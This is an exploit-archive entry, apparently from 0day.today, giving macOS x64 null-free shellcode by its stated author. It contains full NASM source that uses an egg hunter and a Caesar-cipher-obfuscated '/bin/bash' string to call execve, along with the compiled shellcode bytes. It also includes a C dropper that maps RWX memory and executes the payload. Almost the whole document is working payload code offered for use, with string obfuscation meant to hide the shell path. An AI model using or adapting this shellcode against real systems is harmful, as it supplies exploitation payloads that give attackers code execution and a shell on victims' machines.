@@ -1,0 +1,251 @@
+id: 38122
+date: 12/24/2022
+title: macOS/x64 Execve Caesar Cipher String Null-Free Shellcode (286 bytes)
+author: Bobby Cooke
+cves: 
+
+# Shellcode Title: macOS/x64 - Execve Caesar Cipher String Null-Free Shellcode (286 Bytes)
+# Shellcode Author: Bobby Cooke (boku) @0xBoku github.com/boku7
+# Tested on: macOS Monterey; 21.6.0 Darwin Kernel Version; x86_64
+# Shellcode Description:
+# macOS 64 bit shellcode. Uses execve syscall to spawn bash. The string is ceasar cipher crypted with the increment key of 7 within the shellcode. The shellcode finds the string in memory, copies the string to the stack, deciphers the string, and then changes the string terminator to 0x00.
+# Shoutout to IBM X-Force Red Adversary Simulation team! Currently working through EXP-312 and tinkering with macOS shellcoding. Shoutout to the offsec team for the cool course! 
+# Compile & run:
+#     nasm -f macho64 execve.asm -o execve
+#     for x in $(objdump -d execve --x86-asm-syntax=intel | grep "^ " | cut -f1 | awk -F: '{print $2}'); do echo -n "\x"$x; done; echo
+#  # Add shellcode to dropper.c
+#     gcc dropper.c -o dropper
+#     sh-3.2$ pstree -p $(echo $$) | grep $$
+#       \-+= 28533 bobby sh
+#     sh-3.2$ ./dropper 
+#       [+] testcode Length: 286 Bytes
+#       [+] Copying testcode from variable at 0x10aeeade0 to allocated RWX memory at 0x10b030000
+#       [+] Executing testcode at 0x10b030000
+#     bobby$ pstree -p $(echo $$) | grep -B1 $$
+#       \-+= 28533 bobby sh
+#         \-+= 28584 bobby (bash)
+
+bits 64
+global _main
+
+_main:
+  create_stackframe:
+    push rbp           ; push current base pointer to the stack
+    mov rbp, rsp       ; Set Base Stack Pointer for new Stack-Frame
+    sub rsp, 0x60      ; create space for string
+    mov [rbp-0x8], rsp ; Save destination string buffer address
+    jmp short lilypad_1
+
+; char * string eggHunter(egg);
+;     RAX                 RDIa
+; description: starts searching for the supplied egg starting from the callers return address
+eggHunter:
+  mov rcx, [rsp]    ; start the egghunter from the caller function return address
+  hunt:
+    inc rcx         ; move to the hunter to the next byte
+    cmp [rcx], di   ; did we find the first  egg?
+    jne hunt        ; if not, continue hunt
+
+    add cx, 0x2     ; move hunter to 2nd egg location
+    cmp [rcx], di   ; did we find the second egg?
+    jne hunt        ; if not, continue hunt
+
+    add cx, 0x2     ; both eggs found! Move hunter +2 to return the start of buffer addr
+    xchg rax, rcx   ; return start of string address
+    ret
+
+; int length strsize(&string, terminator);
+;      RAX              RDI        RSI
+; description: gets string size of a string that is terminated with a predetermined non-null byte. Terminator byte not included.
+strsize:
+  xor rax, rax      ; clear register
+  xor rcx, rcx      ; set the counter to zero
+  strsize_loop:
+    mov rcx, rdi    ; start of string address
+    add rcx, rax    ; current memory location of char in string
+    cmp [rcx], sil  ; is this the null terminator?
+    je strsize_return
+    prevent_infinite_loop:
+      cmp ax, 0x1001          ; compare value in RAX to 0x1001 (prevent infinite mem scanning)
+      jg strsize_fail2find    ; if value in RAX is greater, jump to label
+    inc rax                   ; move to the next char in the string
+    jmp strsize_loop
+  strsize_fail2find:
+    xor rax, rax    ; return null/ 0x0
+  strsize_return:
+    ret
+
+lilypad_1:
+  jmp short lilypad_2
+
+; char * string terminateString(&string, terminator);
+;     RAX                          RDI        RSI
+; description: Finds the string terminator and changes it to a null byte
+terminateString:
+  xor rcx, rcx      ; set the counter to zero
+  mov rcx, rdi      ; start address to look for terminator
+  loop_find_terminator:
+    cmp [rcx], sil  ; is this the null terminator?
+    je found_terminator
+    inc rcx         ; move to the next char in the string
+    jmp loop_find_terminator
+  found_terminator:
+    mov [rcx], al
+    ret
+
+; void * dst_addr move_memory(void *dst_addr, void *src_addr, size_t mem_size);
+;        RAX                         RDI             RSI              RDX
+; description: Move memory from source address to destination address
+;  ARG1 - RDI: destination address
+;  ARG2 - RSI: source address
+;  ARG3 - RDX: size of the memory
+move_memory:
+  ; Loop through memory and move each byte from source to destination
+  push rdi                 ; save the destination address so we can return it at the end
+  xor rax, rax             ; register to temporarily hold the byte we are copying
+  move_memory_loop:
+    mov al, [rsi]          ; read the byte from source address into the temporary register
+    mov [rdi], al          ; write the byte at the destination address
+    inc rsi                ; increment source address
+    inc rdi                ; increment destination address
+    dec rdx                ; decrement memory size
+    jnz move_memory_loop   ; repeat loop until memory size is 0
+  ; Return to caller
+  pop rax                  ; return the destination address of the memory to the caller
+  ret
+
+lilypad_2:
+  jmp short lilypad_3
+
+; void clear_memory(void *dst_addr, size_t mem_size);
+;                         RDI              RSI
+; description: Writes 0x00 bytes to a destination address
+;  ARG1 - RDI: a pointer to the destination address
+;  ARG2 - RSI: the size of the memory to be written to
+clear_memory:
+  mov rcx, rsi     ; load memory size from second argument into rcx
+  xor rax, rax
+  ; Loop through memory and write 0x00 to each byte in destination address
+  clrmem_loop:
+    mov byte [rdi], al   ; write 0x00 to byte in destination address
+    inc rdi              ; increment destination address
+    dec rcx              ; decrement memory size
+    jnz clrmem_loop      ; repeat loop until memory size is 0
+  
+  ret ; Return to caller
+
+; void basicCaesar_Decrypt(int stringLength, unsigned char * string, int chiperDecrementKey);
+;                                  RDI                        RSI                RDX
+basicCaesar_Decrypt:
+  bcd_loop:
+    sub [rsi], dl  ;  Subtract the value of dl from the memory location pointed to by RSI
+    inc rsi        ;  Increment RSI to point to the next character
+    dec rdi        ;  Decrement stringLength counter
+    test rdi,rdi   ;  Test if stringLength counter is zero
+    jnz bcd_loop   ;  If stringLength counter is not zero, jump back to the beginning of the loop
+
+  ret ; Return to caller
+
+lilypad_3:
+  ; *string = eggHunter(egg); Starts hunt from return address of caller
+  find_execve_string: 
+    xor rdi, rdi        ; clear register
+    mov  di, 0xBCB0     ; Arg 1: Our egg
+    call eggHunter      ; returns string start address
+    mov [rbp-0x10], rax ; Save string address
+
+  get_strlen:
+    mov rdi, [rbp-0x10]    ; Arg 1: string start address
+    xor rsi, rsi           ; clear register
+    mov sil, 0xFF          ; Arg 2: string terminator
+    call strsize ; returns string size
+    mov [rbp-0x18], rax    ; Save string size    
+  
+  ; move_memory(dst_addr, src_addr, mem_size);
+  ;               RDI       RSI       RDX
+  copy_str2stack:
+    mov rdi, [rbp-0x8]      ; Arg 1: String buffer on stack
+    mov rsi, [rbp-0x10]     ; Arg 2: Original string location
+    mov rdx, [rbp-0x18]     ; Arg 3: size
+    call move_memory
+
+  ; basicCaesar_Decrypt(int stringLength, unsigned char * string, int chiperDecrementKey);
+  ;                             RDI                        RSI                RDX
+  do_caesar_cipher_decrypt:
+    mov rdi, [rbp-0x18]       ; Arg 1: string size
+    mov rsi, [rbp-0x8]        ; Arg 2: String buffer on stack
+    xor rdx, rdx              ; clear register
+    add dl, 0x7               ; Arg 3: Ceaser Chiper Key: 7
+    call basicCaesar_Decrypt  ; returns string size
+
+
+  do_terminate_string:
+    mov rdx, [rbp-0x18]     ; string size
+    mov rdi, [rbp-0x8]      ; String buffer on stack
+    add rdi, rdx            ; Arg 1: string terminator location
+    xor rsi, rsi            ; clear register
+    mov sil, 0x1            ; Arg 2: mem size to null
+    call clear_memory       ; returns string size
+
+  ; execve("/bin/bash",NULL,NULL)
+  execve:
+    mov  rdi, [rbp-0x8]  ; Arg 1: String buffer on stack  
+    xor  rsi, rsi        ; Arg 2: NULL
+    xor  rdx, rdx        ; Arg 3: NULL
+    xor  rax, rax        ; clear register for syscall number setup
+    mov  al, 0x2         ; set a bit in register
+    ror  rax, 0x28       ; move the bit over 28 bits to the right in the register
+    mov  al, 0x3b        ; set the lower byte (AL) of the RAX register to the execve syscall number
+    syscall              ; do the syscall interrupt
+  
+  fixstack:
+    add rsp, 0x60    ; clear allocated stack space
+    pop rbp          ; restore stack base pointer
+    ret              ; return to caller
+
+; ~~ Ceaser Chiper String Cryptor ~~
+; Original String:   /bin/bash
+; String Length:     9
+; Ceaser Chiper Key: 7
+; Chiper String:     6ipu6ihzo
+; unsigned char chiperString[] = {0x36,0x69,0x70,0x75,0x36,0x69,0x68,0x7a,0x6f};
+; unsigned char chiperString[] = "\x36\x69\x70\x75\x36\x69\x68\x7a\x6f";
+; Dechipered String: /bin/bash
+shell_path_string:  db  0xB0,0xBC,0xB0,0xBC,"6ipu6ihzo",0xFF
+
+###########################################################################################################################################
+
+// dropper.c
+
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <stdlib.h>
+int (*execute_testcode)();
+
+const unsigned char testcode[] = 
+"\x55\x48\x89\xe5\x48\x83\xec\x60\x48\x89\x65\xf8\xeb\x3c\x48\x8b\x0c\x24\x48\xff\xc1\x66\x39\x39\x75\xf8\x66\x83\xc1\x02\x66\x39\x39\x75\xef\x66\x83\xc1\x02\x48\x91\xc3\x48\x31\xc0\x48\x31\xc9\x48\x89\xf9\x48\x01\xc1\x40\x38\x31\x74\x0e\x66\x3d\x01\x10\x7f\x05\x48\xff\xc0\xeb\xea\x48\x31\xc0\xc3\xeb\x28\x48\x31\xc9\x48\x89\xf9\x40\x38\x31\x74\x05\x48\xff\xc1\xeb\xf6\x88\x01\xc3\x57\x48\x31\xc0\x8a\x06\x88\x07\x48\xff\xc6\x48\xff\xc7\x48\xff\xca\x75\xf1\x58\xc3\xeb\x1f\x48\x89\xf1\x48\x31\xc0\x88\x07\x48\xff\xc7\x48\xff\xc9\x75\xf6\xc3\x28\x16\x48\xff\xc6\x48\xff\xcf\x48\x85\xff\x75\xf3\xc3\x48\x31\xff\x66\xbf\xb0\xbc\xe8\x6d\xff\xff\xff\x48\x89\x45\xf0\x48\x8b\x7d\xf0\x48\x31\xf6\x40\xb6\xff\xe8\x76\xff\xff\xff\x48\x89\x45\xe8\x48\x8b\x7d\xf8\x48\x8b\x75\xf0\x48\x8b\x55\xe8\xe8\x96\xff\xff\xff\x48\x8b\x7d\xe8\x48\x8b\x75\xf8\x48\x31\xd2\x80\xc2\x07\xe8\xab\xff\xff\xff\x48\x8b\x55\xe8\x48\x8b\x7d\xf8\x48\x01\xd7\x48\x31\xf6\x40\xb6\x01\xe8\x84\xff\xff\xff\x48\x8b\x7d\xf8\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05\x48\x83\xc4\x60\x5d\xc3\xb0\xbc\xb0\xbc\x36\x69\x70\x75\x36\x69\x68\x7a\x6f\xff";
+
+int main() {
+    size_t testcode_size = sizeof(testcode);
+
+    printf("[+] testcode Length: %lu Bytes\n", testcode_size);
+  
+    void *rwx_memory = mmap(0, 0x1024, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
+ 
+    if (rwx_memory == MAP_FAILED) {
+        printf("[!] Failed to allocate RWX memory\n");
+        perror("mmap");
+        exit(-1);
+    }
+ 
+    printf("[+] Copying testcode from variable at %p to allocated RWX memory at %p\n",testcode,rwx_memory);
+    memcpy(rwx_memory, testcode, sizeof(testcode));
+    execute_testcode = rwx_memory;
+ 
+    printf("[+] Executing testcode at %p\n",rwx_memory);
+    execute_testcode();
+    return 0;
+}
+
+#  0day.today [2023-03-27]  #
